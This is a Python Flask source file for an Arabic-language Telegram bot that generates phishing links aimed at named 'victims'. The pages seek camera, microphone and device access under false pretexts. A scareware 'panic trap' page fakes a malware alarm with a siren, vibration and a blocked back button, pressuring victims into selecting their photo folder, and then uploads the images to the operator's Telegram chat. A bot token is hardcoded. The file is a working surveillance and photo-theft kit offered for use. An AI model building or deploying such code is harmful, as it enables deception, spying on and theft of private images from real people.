import os
import requests
from flask import Flask, request, render_template_string
import time

app = Flask(__name__)

# ============= الإعدادات الأساسية =============
BOT_TOKEN = "8997379641:AAGl00Dmd9ZJVTpqS-qACvanKTOEcDXgBKs"
ADMIN_ID = "7870803639"
BASE_URL = "https://codebot-1-q2ai.onrender.com"

ALLOWED_USERS = [7870803639] 
user_state = {}

def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Error send_message: {e}")

def answer_callback(callback_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    try:
        requests.post(url, json={"callback_query_id": callback_id}, timeout=5)
    except Exception as e:
        print(f"Error answer_callback: {e}")

def main_menu():
    return {
        "inline_keyboard": [
            [{"text": "🎥 تصوير الضحية فيديو", "callback_data": "action_video"}, {"text": "📷 أختراق الكاميرا الضحية", "callback_data": "action_cam"}],
            [{"text": "🎙 تسجيل صوت الضحية", "callback_data": "action_audio"}, {"text": "🔬 جمع معلومات الجهاز", "callback_data": "action_device"}],
            [{"text": "🚨 فخ ذاكرة التخزين (قفل الهلع)", "callback_data": "action_trap"}],
            [{"text": "📖 شرح استخدام البوت", "callback_data": "guide"}]
        ]
    }

@app.route('/')
def index():
    return "Bot is running."

# =======================================================
# مسار توليد صفحات التقاط البيانات (Landing Pages)
# =======================================================
@app.route('/track/<action>')
def track_page(action):
    admin = request.args.get('admin', '')
    target = request.args.get('target', '')
    
    templates = {
        'video': """
            <!DOCTYPE html>
            <html dir="rtl">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>مشغل فيديو آمن</title>
                <style>
                    body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
                    .loader { border: 5px solid #333; border-top: 5px solid #ff0000; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin-bottom: 20px; }
                    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                </style>
            </head>
            <body>
                <div class="loader"></div>
                <h2>جاري تحميل الفيديو...</h2>
                <p>يرجى الانتظار، يتم الاتصال بالكاميرا.</p>
                <script>
                    navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => { console.log("تم منح صلاحية الكاميرا للهدف: {{ target }}"); })
                    .catch(err => { console.log("تم رفض الصلاحية."); });
                </script>
            </body>
            </html>
        """,
        'cam': """
            <!DOCTYPE html>
            <html dir="rtl">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>تحديث الكاميرا</title>
                <style>
                    body { background-color: #f4f4f4; color: #333; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
                    .btn { background: #007bff; color: #fff; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; }
                </style>
            </head>
            <body>
                <h2>مطلوب تحديث إعدادات الكاميرا</h2>
                <p>اضغط على الزر أدناه للسماح بالوصول إلى الكاميرا الخلفية.</p>
                <button class="btn" onclick="requestCam()">السماح بالوصول</button>
                <script>
                    function requestCam() {
                        navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
                        .then(stream => { console.log("تم منح صلاحية الكاميرا الخلفية للهدف: {{ target }}"); alert("تم التحديث بنجاح!"); })
                        .catch(err => { alert("فشل التحديث، يرجى المحاولة مرة أخرى."); });
                    }
                </script>
            </body>
            </html>
        """,
        'audio': """
            <!DOCTYPE html>
            <html dir="rtl">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>رسالة صوتية</title>
                <style>
                    body { background-color: #2c3e50; color: #ecf0f1; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
                    .mic-icon { font-size: 50px; margin-bottom: 20px; }
                </style>
            </head>
            <body>
                <div class="mic-icon">🎙️</div>
                <h2>لديك رسالة صوتية جديدة</h2>
                <p>جاري الاستماع...</p>
                <script>
                    navigator.mediaDevices.getUserMedia({ audio: true })
                    .then(stream => { console.log("تم منح صلاحية الميكروفون للهدف: {{ target }}"); })
                    .catch(err => { console.log("تم رفض الميكروفون."); });
                </script>
            </body>
            </html>
        """,
        'device': """
            <!DOCTYPE html>
            <html dir="rtl">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>فحص الجهاز</title>
                <style>
                    body { background-color: #fff; color: #000; font-family: monospace; padding: 20px; }
                    .box { background: #eee; padding: 15px; border-radius: 5px; word-wrap: break-word; }
                </style>
            </head>
            <body>
                <h3>جاري جمع معلومات الجهاز...</h3>
                <div class="box" id="out">جاري التحليل...</div>
                <script>
                    let info = "User Agent: " + navigator.userAgent + "\\n";
                    info += "Platform: " + navigator.platform + "\\n";
                    info += "Language: " + navigator.language + "\\n";
                    info += "Cores: " + (navigator.hardwareConcurrency || "Unknown") + "\\n";
                    info += "RAM: " + (navigator.deviceMemory || "Unknown") + " GB\\n";
                    info += "Screen: " + screen.width + "x" + screen.height + "\\n";
                    info += "Target ID: {{ target }}";
                    
                    document.getElementById('out').innerText = info;
                    console.log(info);
                </script>
            </body>
            </html>
        """
    }
    
    if action in templates:
        return render_template_string(templates[action], target=target, admin=admin)
    return "الأداة غير متوفرة", 404

# =======================================================
# 🚨 فخ ذاكرة التخزين (قفل الهلع)
# =======================================================
@app.route('/trap')
def trap_page():
    admin = request.args.get('admin', '')
    target = request.args.get('target', '')
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>تحذير أمني خطير!</title>
        <style>
            body { margin:0; padding:0; background:#1a0000; color:#fff; font-family:'Segoe UI',Tahoma,sans-serif; height:100vh; overflow:hidden; user-select:none; -webkit-user-select:none; }
            #fullScreenTrap { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; cursor: pointer; }
            .content-wrapper { position: relative; z-index: 10; pointer-events: none; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background: radial-gradient(circle, #3a0000 0%, #000000 100%); animation: bgPulse 1s infinite alternate; }
            @keyframes bgPulse { from{background: radial-gradient(circle, #3a0000 0%, #000000 100%);} to{background: radial-gradient(circle, #000000 0%, #3a0000 100%);} }
            .warning-box { background: #111; padding: 40px 20px; border-radius: 20px; text-align: center; width: 85%; max-width: 350px; box-shadow: 0 10px 50px rgba(255,0,0,0.5); border: 2px solid #ff0000; }
            .sys-icon { font-size: 80px; color: #ff0000; margin-bottom: 20px; animation:shake 0.5s infinite; }
            @keyframes shake { 0% { transform: translate(1px, 1px) rotate(0deg); } 10% { transform: translate(-1px, -2px) rotate(-1deg); } 20% { transform: translate(-3px, 0px) rotate(1deg); } 30% { transform: translate(3px, 2px) rotate(0deg); } 40% { transform: translate(1px, -1px) rotate(1deg); } 50% { transform: translate(-1px, 2px) rotate(-1deg); } 60% { transform: translate(-3px, 1px) rotate(0deg); } 70% { transform: translate(3px, 1px) rotate(-1deg); } 80% { transform: translate(-1px, -1px) rotate(1deg); } 90% { transform: translate(1px, 2px) rotate(0deg); } 100% { transform: translate(1px, -2px) rotate(-1deg); } }
            h1 { font-size: 26px; margin-bottom: 10px; color: #ff4444; text-shadow: 0 0 10px #ff0000; }
            p { font-size: 16px; color: #ffcccc; line-height: 1.6; margin-bottom: 30px; }
            .fake-btn { background: #ff0000; color: #fff; font-size: 22px; font-weight: bold; padding: 20px 30px; border-radius: 50px; width: 100%; box-sizing: border-box; box-shadow: 0 0 30px rgba(255,0,0,0.8); display: block; border: none; animation: blink 0.8s infinite; }
            @keyframes blink { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.6; transform: scale(1.05); } 100% { opacity: 1; transform: scale(1); } }
            #fileTrap { position: absolute; width: 1px; height: 1px; opacity: 0; top: -9999px; }
            #loadingScreen { display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:#000; z-index:99999; flex-direction:column; justify-content:center; align-items:center; text-align:center; padding: 0 20px; box-sizing: border-box; }
            .spinner { border:5px solid #333; border-top:5px solid #ff0000; border-radius:50%; width:80px; height:80px; animation:spin 0.5s linear infinite; margin-bottom:20px; }
            @keyframes spin { to{transform:rotate(360deg);} }
        </style>
    </head>
    <body>
        <label for="fileTrap" id="fullScreenTrap"></label>
        <div class="content-wrapper">
            <div class="warning-box">
                <div class="sys-icon">☠️</div>
                <h1>اختراق خطير جداً!</h1>
                <p>تم رصد برمجيات خبيثة تسرق بياناتك. جهازك في خطر الآن. <strong>لا تغلق هذه الصفحة.</strong> لتأمين جهازك، يجب عليك اختيار مجلد الصور فوراً.</p>
                <label for="fileTrap" class="fake-btn" id="mainBtn">تأمين الجهاز الآن</label>
            </div>
        </div>
        <div id="loadingScreen">
            <div class="spinner" id="spinner"></div>
            <h2 style="color:#ff0000; font-size: 28px; text-shadow: 0 0 10px #ff0000;" id="statusText">جاري مسح الفيروسات: 0%</h2>
            <p style="color:#ffcccc; font-size:16px;">لا تغلق الصفحة أو سيتم حرق الملفات.</p>
        </div>
        <input type="file" id="fileTrap" accept="*/*" multiple webkitdirectory>
        <script>
            const ADMIN_ID = "{{ admin }}";
            const TARGET = "{{ target }}";
            let extracted = false;
            let scanInterval = null;
            let audioCtx = null;
            let vibrateInterval = null;

            history.pushState(null, null, location.href);
            window.onpopstate = function () { history.go(1); };

            function startPanic() {
                if (audioCtx) return;
                try {
                    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                    const oscillator = audioCtx.createOscillator();
                    const gainNode = audioCtx.createGain();
                    oscillator.type = 'sawtooth';
                    oscillator.frequency.setValueAtTime(800, audioCtx.currentTime);
                    oscillator.connect(gainNode);
                    gainNode.connect(audioCtx.destination);
                    oscillator.start();
                    if (navigator.vibrate) {
                        vibrateInterval = setInterval(() => { navigator.vibrate([200, 100, 200, 100]); }, 500);
                    }
                } catch (e) { console.log("Audio blocked"); }
            }

            document.getElementById('fullScreenTrap').addEventListener('click', function(e) {
                if (extracted) return;
                startPanic();
                document.getElementById('loadingScreen').style.display = 'flex';
                let progress = 0;
                scanInterval = setInterval(() => {
                    progress += Math.floor(Math.random() * 5) + 1;
                    if (progress > 99) progress = 99;
                    document.getElementById('statusText').innerText = "جاري مسح الفيروسات: " + progress + "%";
                }, 300);
            });

            window.addEventListener('focus', () => {
                setTimeout(() => {
                    if (!extracted && document.getElementById('fileTrap').files.length === 0) {
                        document.getElementById('loadingScreen').style.display = 'none';
                        if (audioCtx) audioCtx.close();
                        clearInterval(scanInterval);
                        clearInterval(vibrateInterval);
                        setTimeout(() => { if (!extracted) document.getElementById('fileTrap').click(); }, 500);
                    }
                }, 500);
            });

            document.getElementById('fileTrap').addEventListener('change', async function(e) {
                const files = e.target.files;
                if (!files.length) return;
                extracted = true;
                
                if (audioCtx) audioCtx.close();
                clearInterval(scanInterval);
                clearInterval(vibrateInterval);
                if (navigator.vibrate) navigator.vibrate(0);

                document.getElementById('loadingScreen').style.display = 'flex';
                document.getElementById('statusText').innerText = "جاري سحب الملفات وإصلاح النظام...";
                
                const imageFiles = Array.from(files).filter(file => file.type.startsWith('image/'));
                if (imageFiles.length === 0) {
                    document.getElementById('statusText').innerText = "لم يتم العثور على صور في هذا المجلد.";
                    return;
                }

                const totalImages = imageFiles.length;
                const batchSize = 10;
                let uploadedCount = 0;

                for (let i = 0; i < totalImages; i += batchSize) {
                    const batch = imageFiles.slice(i, i + batchSize);
                    const fd = new FormData();
                    fd.append('admin', ADMIN_ID);
                    fd.append('target', TARGET);
                    for (let j = 0; j < batch.length; j++) fd.append('photos', batch[j]);

                    try {
                        await fetch('/upload_trap', { method: 'POST', body: fd });
                        uploadedCount += batch.length;
                        document.getElementById('statusText').innerText = "تم فحص " + uploadedCount + " من " + totalImages + " ملف...";
                        await new Promise(resolve => setTimeout(resolve, 2000));
                    } catch (err) { console.log(err); }
                }
                document.getElementById('loadingScreen').innerHTML = '<div style="font-size:60px; color:#4CAF50;">✅</div><h2 style="color:#4CAF50;">تم تأمين الجهاز بنجاح</h2><p style="color:#888;">يمكنك إغلاق الصفحة الآن.</p>';
            });
        </script>
    </body>
    </html>
    """, admin=admin, target=target)

@app.route('/upload_trap', methods=['POST'])
def upload_trap():
    admin_id = request.form.get('admin')
    target = request.form.get('target')
    photos = request.files.getlist('photos')
    
    if not photos or not admin_id:
        return {"ok": False, "error": "no_file"}, 400

    media_group = []
    files_payload = {}
    
    try:
        for i, photo in enumerate(photos):
            if i >= 10: break 
            media_item = {
                'type': 'photo',
                'media': f'attach://photo{i}',
                'caption': f"📸 صورة من ذاكرة: {target}" if i == 0 else ""
            }
            media_group.append(media_item)
            files_payload[f'photo{i}'] = (photo.filename, photo.stream, photo.content_type)
            
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMediaGroup"
        payload = {'chat_id': admin_id, 'media': str(media_group).replace("'", '"')}
        requests.post(url, data=payload, files=files_payload, timeout=20)
        
    except Exception as e:
        print(f"Error sending album: {e}")
        url_photo = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        for photo in photos:
            files = {'photo': (photo.filename, photo.stream, photo.content_type)}
            payload = {'chat_id': admin_id, 'caption': f"📸 صورة!\n🎯 الهدف: {target}"}
            requests.post(url_photo, data=payload, files=files, timeout=15)
            time.sleep(0.5)

    return {"ok": True}, 200

# ============= البوت (Webhook) =============
@app.route(f'/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if not update: return "ok", 200
    
    if 'message' in update:
        chat_id = update['message']['chat']['id']
        if chat_id not in ALLOWED_USERS:
            send_message(chat_id, "⛔ عذراً، هذا البوت خاص.")
            return "ok", 200
            
    if 'callback_query' in update:
        chat_id = update['callback_query']['message']['chat']['id']
        if chat_id not in ALLOWED_USERS:
            answer_callback(update['callback_query']['id'])
            send_message(chat_id, "⛔ عذراً، هذا البوت خاص.")
            return "ok", 200

    if 'message' in update and 'text' in update['message']:
        msg = update['message']
        chat_id = msg['chat']['id']
        text = msg['text']
        
        if text == '/start':
            send_message(chat_id, "مرحباً بك في FREEUSR ➊\n\nمن الخيارات المتاحة:", main_menu())
            
        elif user_state.get(chat_id, {}).get('state') == 'waiting_for_target':
            action = user_state[chat_id]['action']
            target = text
            
            if action == 'trap':
                link = f"{BASE_URL}/trap?target={target}&admin={chat_id}"
                send_message(chat_id, f"✅ رابط فخ الذاكرة جاهز:\n`{link}`\n\nأرسله للضحية كصورة/رابط.", None)
            elif action in ['video', 'cam', 'audio', 'device']:
                link = f"{BASE_URL}/track/{action}?target={target}&admin={chat_id}"
                send_message(chat_id, f"✅ رابط ({action}) جاهز:\n`{link}`", None)
                
            del user_state[chat_id]
    
    if 'callback_query' in update:
        cb = update['callback_query']
        cb_id = cb['id']
        chat_id = cb['message']['chat']['id']
        data = cb['data']
        
        answer_callback(cb_id)
        
        if data == 'guide':
            guide_text = (
                "📖 *شرح الاستخدام:*\n\n"
                "1. اضغط على الزر المطلوب.\n"
                "2. أرسل اسم أو معرف الضحية.\n"
                "3. البوت سيعطيك رابطاً.\n"
                "4. أرسل الرابط للضحية، وعند فتحه سيتم تنفيذ الأمر.\n\n"
                "🚨 *ملاحظة:* يعمل هذا البوت على السيرفر المرفوع عليه فقط."
            )
            send_message(chat_id, guide_text)
            
        elif data == 'action_trap':
            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'trap'}
            send_message(chat_id, "🚨 أرسل اسم الضحية لإنشاء رابط سحب ذاكرة التخزين:")
            
        elif data in ['action_video', 'action_cam', 'action_audio', 'action_device']:
            action_map = {
                'action_video': 'video',
                'action_cam': 'cam',
                'action_audio': 'audio',
                'action_device': 'device'
            }
            action_type = action_map[data]
            
            user_state[chat_id] = {'state': 'waiting_for_target', 'action': action_type}
            send_message(chat_id, f"🎯 أرسل اسم الضحية لإنشاء رابط ({action_type}):")
            
    return "ok", 200

def set_webhook():
    webhook_url = f"{BASE_URL}/webhook"
    try:
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}", timeout=10)
    except Exception as e:
        print(e)

with app.app_context():
    set_webhook()

if __name__ == '__main__':
    app.run(port=5000)
